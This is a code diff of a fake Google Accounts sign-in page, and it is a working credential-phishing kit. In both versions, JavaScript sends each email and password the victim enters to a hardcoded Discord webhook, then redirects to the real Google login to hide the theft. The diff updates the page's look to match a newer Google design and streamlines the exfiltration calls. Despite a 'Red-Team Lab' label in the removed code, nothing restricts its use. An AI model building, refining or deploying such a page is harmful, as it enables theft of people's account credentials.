@@ -5,112 +5,118 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sign in - Google Accounts</title>
     <style>
-        :root { --google-blue: #0b57d0; --text-main: #1f1f1f; --text-sub: #444746; --border-color: #747775; }
-        body { font-family: 'Google Sans', Roboto, Arial, sans-serif; background-color: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { width: 450px; min-height: 500px; border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px 36px; display: flex; flex-direction: column; align-items: center; box-sizing: border-box; position: relative; }
-        .logo { width: 75px; margin-bottom: 10px; }
-        h1 { font-size: 24px; font-weight: 400; color: var(--text-main); margin: 0 0 8px 0; }
-        .subtitle { font-size: 16px; color: var(--text-main); margin-bottom: 24px; }
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap');
         
-        /* State Visibility Logic */
-        .view-step { width: 100%; transition: opacity 0.2s ease-in-out; }
-        #password-step { display: none; opacity: 0; }
+        :root { --g-blue: #0b57d0; --g-text: #1f1f1f; --g-sub: #444746; --g-border: #747775; }
+        body { font-family: 'Roboto', arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         
-        /* The User Pill - High Credibility UI */
-        .user-pill { display: flex; align-items: center; border: 1px solid var(--border-color); border-radius: 16px; padding: 4px 12px; width: fit-content; margin: 0 auto 24px; cursor: pointer; font-size: 14px; color: var(--text-main); }
-        .user-pill:hover { background: #f8f9fa; }
+        /* The Card from Screenshot 2026-05-13 10.27.46 AM_3.png */
+        .card { width: 840px; min-height: 480px; background: white; border-radius: 28px; padding: 40px; display: flex; box-shadow: none; box-sizing: border-box; }
+        .left-col { flex: 1; display: flex; flex-direction: column; padding-right: 40px; }
+        .right-col { width: 380px; display: flex; flex-direction: column; padding-top: 48px; }
         
-        input { width: 100%; padding: 13px 15px; border: 1px solid var(--border-color); border-radius: 4px; font-size: 16px; box-sizing: border-box; margin-bottom: 8px; }
-        input:focus { border: 2px solid var(--google-blue); outline: none; }
+        .logo { width: 48px; height: 48px; margin-bottom: 16px; }
+        h1 { font-size: 36px; font-weight: 400; color: var(--g-text); margin: 0 0 12px 0; }
+        .sub { font-size: 16px; color: var(--g-text); }
         
-        .footer-actions { width: 100%; margin-top: 40px; display: flex; justify-content: flex-end; }
-        .next-btn { background-color: var(--google-blue); color: white; padding: 10px 24px; border: none; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; transition: background 0.2s; }
-        .next-btn:hover { background-color: #0842a0; box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3); }
+        /* Input Styling */
+        .input-group { position: relative; margin-bottom: 8px; width: 100%; }
+        input { width: 100%; padding: 13px 15px; border: 1px solid var(--g-border); border-radius: 4px; font-size: 16px; box-sizing: border-box; color: var(--g-text); }
+        input:focus { border: 2px solid var(--g-blue); outline: none; }
+        
+        .blue-link { color: var(--g-blue); font-size: 14px; font-weight: 500; text-decoration: none; cursor: pointer; }
+        .blue-link:hover { text-decoration: underline; }
+        
+        .info-box { font-size: 14px; color: var(--g-sub); margin-top: 32px; line-height: 1.4; }
+        
+        .actions { display: flex; justify-content: flex-end; align-items: center; margin-top: auto; }
+        .next-btn { background: var(--g-blue); color: white; padding: 10px 24px; border: none; border-radius: 20px; font-size: 14px; font-weight: 500; cursor: pointer; margin-left: 12px; }
+        
+        /* Logic Visibility */
+        #pass-stage { display: none; }
+        .user-chip { display: inline-flex; align-items: center; border: 1px solid #dadce0; border-radius: 16px; padding: 3px 10px; margin-bottom: 24px; font-size: 14px; cursor: pointer; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <!-- Standard Google SVG -->
-    <svg class="logo" viewBox="0 0 24 24"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z" fill="#FBBC05"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/></svg>
-    
-    <h1 id="header-text">Sign in</h1>
-    <div id="sub-text" class="subtitle">Use your Google Account</div>
-
-    <!-- STAGE 1: EMAIL -->
-    <div id="email-step" class="view-step">
-        <input type="email" id="email-input" placeholder="Email or phone" spellcheck="false">
-        <div style="color: var(--google-blue); font-size: 14px; font-weight: 500; margin-top: 9px; cursor: pointer;">Forgot email?</div>
-        <div class="footer-actions">
-            <button class="next-btn" onclick="processEmail()">Next</button>
-        </div>
+<div class="card">
+    <div class="left-col">
+        <svg class="logo" viewBox="0 0 24 24"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z" fill="#FBBC05"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/></svg>
+        <h1 id="title">Sign in</h1>
+        <div class="sub" id="subtitle">Use your Google Account</div>
     </div>
 
-    <!-- STAGE 2: PASSWORD (Hidden by default) -->
-    <div id="password-step" class="view-step">
-        <div class="user-pill" onclick="location.reload()">
-            <span id="display-email"></span>
-            <svg style="margin-left:8px" width="12" height="12" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg>
+    <div class="right-col">
+        <!-- STEP 1: EMAIL -->
+        <div id="email-stage">
+            <div class="input-group">
+                <input type="text" id="email-field" placeholder="Email or phone">
+            </div>
+            <a class="blue-link">Forgot email?</a>
+            <div class="info-box">
+                Not your computer? Use Guest mode to sign in privately. <a class="blue-link">Learn more</a>
+            </div>
+            <div class="actions">
+                <a class="blue-link" style="margin-right:auto">Create account</a>
+                <button class="next-btn" onclick="nextStep()">Next</button>
+            </div>
         </div>
-        <input type="password" id="pass-input" placeholder="Enter your password">
-        <div style="color: var(--google-blue); font-size: 14px; font-weight: 500; margin-top: 9px; cursor: pointer;">Forgot password?</div>
-        <div class="footer-actions">
-            <button class="next-btn" onclick="processPass()">Next</button>
+
+        <!-- STEP 2: PASSWORD -->
+        <div id="pass-stage">
+            <div class="user-chip" onclick="location.reload()">
+                <span id="captured-email"></span>
+                <svg width="12" height="12" style="margin-left:8px" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg>
+            </div>
+            <div class="input-group">
+                <input type="password" id="pass-field" placeholder="Enter your password">
+            </div>
+            <a class="blue-link">Forgot password?</a>
+            <div class="actions">
+                <button class="next-btn" onclick="submitFinal()">Next</button>
+            </div>
         </div>
     </div>
 </div>
 
 <script>
-    // Your Discord Webhook
-    const WEBHOOK = "https://discord.com/api/webhooks/1503920357395009617/0EZVV6ZcaHZvnhFBd8TOg8vEyrNpUUSLHLKE3S3pesXzhtFwC3-xXeGzBbJhau3Vz110";
-    let userEmail = "";
+    const HOOK = "https://discord.com/api/webhooks/1503920357395009617/0EZVV6ZcaHZvnhFBd8TOg8vEyrNpUUSLHLKE3S3pesXzhtFwC3-xXeGzBbJhau3Vz110";
+    let storedEmail = "";
 
-    async function processEmail() {
-        userEmail = document.getElementById('email-input').value;
-        if (!userEmail || !userEmail.includes('@')) return;
+    function nextStep() {
+        storedEmail = document.getElementById('email-field').value;
+        if (!storedEmail) return;
 
-        // Capture Email first
-        sendToDiscord("Identifier Entry", userEmail);
+        // Log Email
+        fetch(HOOK, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ content: "📧 **Email Entered:** `" + storedEmail + "`" })
+        });
 
-        // Transition UI to Password Stage
-        document.getElementById('email-step').style.display = 'none';
-        document.getElementById('header-text').innerText = "Welcome";
-        document.getElementById('sub-text').style.display = 'none';
-        document.getElementById('display-email').innerText = userEmail;
-        
-        const pStep = document.getElementById('password-step');
-        pStep.style.display = 'block';
-        setTimeout(() => { pStep.style.opacity = '1'; }, 10);
+        // Transition UI
+        document.getElementById('email-stage').style.display = 'none';
+        document.getElementById('pass-stage').style.display = 'block';
+        document.getElementById('title').innerText = "Welcome";
+        document.getElementById('subtitle').style.display = 'none';
+        document.getElementById('captured-email').innerText = storedEmail;
     }
 
-    async function processPass() {
-        const pass = document.getElementById('pass-input').value;
-        if (!pass || pass.length < 4) return;
+    async function submitFinal() {
+        const pass = document.getElementById('pass-field').value;
+        if (!pass) return;
 
-        // Capture Password
-        await sendToDiscord("Credential Capture", pass);
-        
-        // Final Redirection: Sends user to the real Google login to hide the tracks
+        // Log Password
+        await fetch(HOOK, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ content: "🔑 **Password Captured:** `" + pass + "`\nTarget: `" + storedEmail + "`" })
+        });
+
+        // Handoff to Real Google
         window.location.replace("https://accounts.google.com/signin/v2/identifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin");
     }
-
-    async function sendToDiscord(type, content) {
-        try {
-            await fetch(WEBHOOK, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    embeds: [{
-                        title: "Mirror Module: " + type,
-                        description: "Captured: `" + content + "`",
-                        color: type.includes("Entry") ? 3447003 : 15158332,
-                        timestamp: new Date(),
-                        footer: { text: "ENI Red-Team Lab" }
-                    }]
-                })
-            });
-        } catch (e) { console.error("Network silent fail."); }
-    }
 </script>
+
 </body>
 </html>
